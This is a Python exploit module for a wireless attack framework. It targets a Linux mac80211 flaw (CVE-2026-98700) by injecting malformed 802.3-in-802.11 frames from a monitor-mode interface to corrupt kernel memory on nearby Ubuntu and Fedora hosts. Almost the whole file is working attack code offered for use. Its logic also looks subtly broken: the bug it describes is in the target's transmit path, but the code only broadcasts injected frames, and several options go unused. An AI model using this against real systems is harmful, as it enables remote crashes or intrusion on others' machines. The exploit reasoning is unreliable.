# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Linux mac80211 ieee80211_8023_xmit Input Validation Failure (CVE-2026-98700).

    The ieee80211_8023_xmit function in net/mac80211/tx.c performs
    hardware-offloaded 802.3 to 802.11 encapsulation for transmit.
    When 802.3 encap offload is enabled, the function trusts header
    fields from the incoming SKB without sufficient validation.  A
    crafted 802.3 frame with an oversized or malformed header can
    cause the kernel to read or write beyond allocated buffer bounds,
    leading to memory corruption and potential remote code execution
    from an adjacent network position.

    The vulnerability is reachable over the air when the target station
    is associated with an attacker-controlled access point that has
    802.3 encap offload enabled.

    CVSS v3.1: estimated 8.0+ (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Linux mac80211 802.3 Encap Offload Input Validation Failure (CVE-2026-98700)",
        "description": (
            "Exploits CVE-2026-98700, an input validation failure in the "
            "ieee80211_8023_xmit function of the Linux mac80211 subsystem.  "
            "When 802.3 encapsulation offload is active, the transmit path "
            "trusts header fields from the incoming SKB without proper bounds "
            "checking.  Sending crafted 802.3 frames with malformed headers "
            "through an attacker-controlled AP triggers out-of-bounds memory "
            "access in the kernel, potentially achieving remote code execution."
        ),
        "authors": (
            "mrhenrike (Andre Henrique)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-98700",
            "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git",
        ),
        "disclosure_date": "2026-01-15",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Linux kernels with 802.3 encap offload support (5.13+)",
            "Ubuntu 22.04/24.04 (unpatched)",
            "Fedora 38+ (unpatched)",
        ),
    }

    target = OptIP("", "Target station MAC or BSSID (monitor mode required)")
    port = OptPort(1, "Unused (WiFi frame injection does not use ports)")
    timeout = OptFloat(5.0, "Timeout for frame injection and response capture")
    interface = OptString("wlan0mon", "Monitor-mode wireless interface for injection")
    payload_size = OptInteger(2048, "Malformed 802.3 payload size in bytes")
    injection_rounds = OptInteger(32, "Number of injection rounds")

    # 802.11 frame type/subtype constants
    _FRAME_TYPE_DATA = 0x02
    _SUBTYPE_DATA = 0x00
    _SUBTYPE_QOS_DATA = 0x08

    # 802.3 / Ethernet constants
    _ETHER_TYPE_IPV4 = 0x0800
    _ETHER_TYPE_EAPOL = 0x888E
    _ETHER_HEADER_LEN = 14
    _LLC_SNAP_HEADER = b"\xAA\xAA\x03\x00\x00\x00"

    # Broadcom specific; 802.3 encap offload marker
    _ENCAP_OFFLOAD_FLAG = 0x8000

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\x00\x00\x00\x01"
    _FAKE_SRC = b"\x02\x00\x00\x00\x00\x02"

    def _mac_to_bytes(self, mac: str) -> bytes:
        return bytes(int(b, 16) for b in mac.split(":"))

    def _build_radiotap_header(self) -> bytes:
        """Minimal radiotap header for frame injection."""
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_frame_control(self, frame_type: int, subtype: int) -> bytes:
        fc = (frame_type & 0x03) | ((subtype & 0x0F) << 4)
        return struct.pack("<BB", fc, 0x00)

    def _build_8023_frame(self, oversized: bool = True) -> bytes:
        """Build a crafted 802.3 Ethernet frame.

        The vulnerability triggers when the mac80211 transmit path
        processes this frame for 802.3-to-802.11 encapsulation offload.
        The malformed header length field causes the kernel to
        miscalculate buffer boundaries.
        """
        dst = self._BROADCAST
        src = self._FAKE_SRC

        if oversized:
            # Craft a frame with a length field that exceeds actual data,
            # triggering the OOB access in ieee80211_8023_xmit
            declared_len = self.payload_size + 256
            payload = b"\x41" * self.payload_size
        else:
            declared_len = 64
            payload = b"\x00" * 64

        # Ethernet header: dst(6) + src(6) + ethertype/length(2)
        ether_header = dst + src + struct.pack(">H", declared_len & 0xFFFF)

        # LLC/SNAP header that the offload path processes
        llc_snap = self._LLC_SNAP_HEADER + struct.pack(">H", self._ETHER_TYPE_IPV4)

        return ether_header + llc_snap + payload

    def _build_injection_frame(self, channel: int) -> bytes:
        """Wrap the crafted 802.3 frame inside an 802.11 data frame
        for injection via monitor mode.

        The target's driver will attempt 802.3 encap offload on the
        inner frame, triggering the vulnerability.
        """
        fc = self._build_frame_control(self._FRAME_TYPE_DATA, self._SUBTYPE_QOS_DATA)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        bssid = self._FAKE_BSSID
        src = self._FAKE_SRC
        seq_ctrl = struct.pack("<H", 0)
        qos_ctrl = struct.pack("<H", 0)

        header = fc + duration + dst + bssid + src + seq_ctrl + qos_ctrl

        inner_frame = self._build_8023_frame(oversized=True)

        radiotap = self._build_radiotap_header()
        return radiotap + header + inner_frame

    def _build_probe_frame(self) -> bytes:
        """Build a minimal data frame for interface validation."""
        fc = self._build_frame_control(self._FRAME_TYPE_DATA, self._SUBTYPE_DATA)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        src = self._FAKE_SRC
        bssid = self._FAKE_BSSID
        seq_ctrl = struct.pack("<H", 0)
        header = fc + duration + dst + src + bssid + seq_ctrl
        payload = b"\x00" * 32

        radiotap = self._build_radiotap_header()
        return radiotap + header + payload

    def _inject_frame(self, raw_sock: socket.socket, frame: bytes) -> bool:
        try:
            raw_sock.send(frame)
            return True
        except OSError:
            return False

    def _open_raw_wifi(self) -> socket.socket | None:
        """Open a raw socket on the monitor-mode interface."""
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        """Verify we can inject frames on the monitor interface."""
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        try:
            probe = self._build_probe_frame()
            self._inject_frame(raw, probe)
            try:
                data = raw.recv(4096)
                return len(data) > 0
            except (OSError, TimeoutError):
                return True
        finally:
            raw.close()

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return

        if not self.check():
            print_error(
                "Cannot open raw socket on the monitor interface. "
                "Ensure the interface is in monitor mode and you have root privileges."
            )
            return

        print_success("Monitor-mode socket established; injecting 802.3 encap offload frames")
        self._exploit()

    def _exploit(self) -> None:
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket for injection")
            return

        channel = 6

        print_status(
            f"Injecting {self.injection_rounds} crafted 802.3 encap frames "
            f"(payload {self.payload_size} bytes) on channel {channel}"
        )

        success = 0
        for rnd in range(self.injection_rounds):
            frame = self._build_injection_frame(channel)
            if self._inject_frame(raw, frame):
                success += 1
            time.sleep(0.005)

        raw.close()

        print_status(f"Injected {success}/{self.injection_rounds} frames")
        print_info(
            "If the target kernel has 802.3 encap offload enabled, the "
            "ieee80211_8023_xmit path should process the malformed header "
            "and trigger an out-of-bounds access. Monitor the target for "
            "kernel oops or unexpected behavior."
        )
